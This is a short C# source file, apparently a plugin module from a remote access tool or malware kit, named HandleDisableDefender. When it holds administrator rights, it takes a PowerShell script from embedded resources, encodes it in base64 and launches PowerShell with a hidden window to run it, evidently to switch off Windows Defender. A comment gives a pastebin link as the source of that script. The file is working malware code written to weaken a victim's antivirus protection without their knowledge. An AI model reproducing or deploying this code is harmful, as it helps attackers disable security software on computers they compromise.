using System;
using System.Diagnostics;
using System.Security.Principal;
using System.Text;
using Plugin.Properties;

namespace Plugin.Handler
{
    internal class HandleDisableDefender
    {
        public void Run()
        {
            Debug.WriteLine("Plugin Invoked");
            if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)) return;
            //https://pastebin.com/raw/hLsCCZQY
            var b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(Resources.Powershell));
            RunPS("-enc " + b64);
        }

        private void RunPS(string args)
        {
            var proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = args,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
        }
    }
}